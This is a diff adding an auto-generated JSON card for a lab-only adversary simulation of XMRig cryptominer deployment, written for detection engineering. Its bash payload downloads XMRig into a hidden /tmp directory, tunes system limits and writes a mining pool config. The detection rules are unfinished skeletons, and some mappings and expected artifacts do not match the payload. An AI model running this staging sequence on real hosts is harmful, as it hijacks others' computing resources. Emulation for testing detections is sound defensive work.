@@ -1,0 +1,262 @@
+{
+  "id": "TTP-2026-0023",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-05-20T21:16:12+00:00",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-cdr",
+      "auto-generated",
+      "skeleton-draft",
+      "severity-high",
+      "needs-detection-engineering-review"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "cloud",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "kubernetes"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Cryptominer Deployment \u2014 Unit 42 XMRig Variant",
+    "summary": "Auto-generated draft from CortexSim scenario SIM-CDR-002. Plane: CDR. Primary technique: T1496. Requires human enrichment of BIOC logic + panw_mapping rule_ids.",
+    "description": "Auto-generated draft from CortexSim scenario SIM-CDR-002. Plane: CDR. Primary technique: T1496. Requires human enrichment of BIOC logic + panw_mapping rule_ids.\n\nSource scenario: SIM-CDR-002.\nUC: Cryptomining Activity Detection / TC: XMRig Deployment and Execution.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1496",
+        "name": "Resource Hijacking",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0040"
+        ],
+        "tactic_names": [
+          "Impact"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": []
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1496 (TODO \u2014 pin atomic test ref)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab environment matching scenario SIM-CDR-002 requirements."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# step-1: Disable security limits and prepare mining environment\nulimit -n 65535 2>/dev/null; \\\nulimit -u unlimited 2>/dev/null; \\\necho never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; \\\nsysctl -w vm.nr_hugepages=128 2>/dev/null || true; \\\nmkdir -p /tmp/.xmr && echo '[*] Mining env prepared'\n# step-2: Download XMRig binary (Unit 42 observed delivery mechanism)\nARCH=$(uname -m); \\\nif [ \"$ARCH\" = \"x86_64\" ]; then XMRIG_URL=\"https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz\"; \\\nelse XMRIG_URL=\"https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv8.tar.gz\"; fi; \\\ncurl -sSL \"$XMRIG_URL\" -o /tmp/.xmr/xmrig.tar.gz && \\\ntar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && \\\nchmod +x /tmp/.xmr/xmrig && \\\necho '[*] XMRig downloaded successfully'\n# step-3: Configure XMRig mining pool connection\ncat > /tmp/.xmr/config.json << 'XMRCFG'\n{\n  \"autosave\": true,\n  \"cpu\": {\"enabled\": true, \"max-threads-hint\": 75},\n  \"pools\": [{\n    \"url\": \"pool.minexmr.com:4444\",\n    \"user\": \"SIMULATION_WALLET_DO_NOT_USE\",\n    \"pass\": \"cortexsim-test\",\n    \"keepalive\": true\n  }]\n}\nXMRCFG\necho '[*] Mining pool config written'",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching curl (heuristic from scenario step step-02)",
+        "expected_value": "process_name CONTAINS \"curl\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP(S) request from the scenario step",
+        "expected_value": "dst_port IN (80, 443) AND src_host = scenario_target"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching nc (heuristic from scenario step step-05)",
+        "expected_value": "process_name CONTAINS \"nc\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "crontab -l 2>/dev/null | grep -v xmrig | crontab - 2>/dev/null || true\nrm -rf /tmp/.xmr\necho '[CortexSim] SIM-CDR-002 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "System limit modification in container \u2014 ulimit/sysctl tuning consistent with cryptominer pre-deployment",
+        "description": "System limit modification in container \u2014 ulimit/sysctl tuning consistent with cryptominer pre-deployment",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1562.001\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1562.001"
+        ]
+      },
+      {
+        "name": "XMRig binary download and extraction \u2014 cryptominer tool transfer signature",
+        "description": "XMRig binary download and extraction \u2014 cryptominer tool transfer signature",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1105\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      },
+      {
+        "name": "Compressed binary downloaded and extracted to /tmp hidden directory in container",
+        "description": "Compressed binary downloaded and extracted to /tmp hidden directory in container",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1105\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      },
+      {
+        "name": "Known cryptomining pool domain/IP in config file \u2014 pool.minexmr.com association",
+        "description": "Known cryptomining pool domain/IP in config file \u2014 pool.minexmr.com association",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1496\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1496"
+        ]
+      },
+      {
+        "name": "Cryptominer binary execution \u2014 XMRig process tree detected by CDR runtime BIOC",
+        "description": "Cryptominer binary execution \u2014 XMRig process tree detected by CDR runtime BIOC",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1496\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1496"
+        ]
+      },
+      {
+        "name": "Sustained CPU spike from container process consistent with cryptomining workload",
+        "description": "Sustained CPU spike from container process consistent with cryptomining workload",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1496\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1496"
+        ]
+      },
+      {
+        "name": "Crontab modification to persist cryptominer \u2014 scheduled task creation from container",
+        "description": "Crontab modification to persist cryptominer \u2014 scheduled task creation from container",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1053.005\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      },
+      {
+        "name": "Cryptominer binary added to cron schedule \u2014 multi-stage malware persistence behavior",
+        "description": "Cryptominer binary added to cron schedule \u2014 multi-stage malware persistence behavior",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1053.005\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      }
+    ],
+    "xql_queries": [],
+    "correlation_rules": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CDR-0023"
+        ],
+        "license_required": "pro"
+      },
+      {
+        "module": "prisma-cloud",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CDR-0023"
+        ],
+        "license_required": "pro"
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-CLOUD-023",
+        "name": "Cryptomining Activity Detection",
+        "description": "Cryptomining Activity Detection",
+        "test_cases": [
+          {
+            "test_case_id": "TC-CLOUD-023A",
+            "objective": "TBD \u2014 author concrete pass/fail criteria",
+            "success_criteria": [
+              "TBD \u2014 author at least one verifiable success criterion"
+            ],
+            "expected_score_weight": 1.0
+          }
+        ]
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit42 - Large-Scale Monero Cryptomining Operation Using XMRig",
+      "url": "https://unit42.paloaltonetworks.com/unit42-large-scale-monero-cryptocurrency-mining-operation-using-xmrig/",
+      "publisher": "Unit42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1496",
+      "url": "https://attack.mitre.org/techniques/T1496/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-CDR-002."
+    }
+  ]
+}
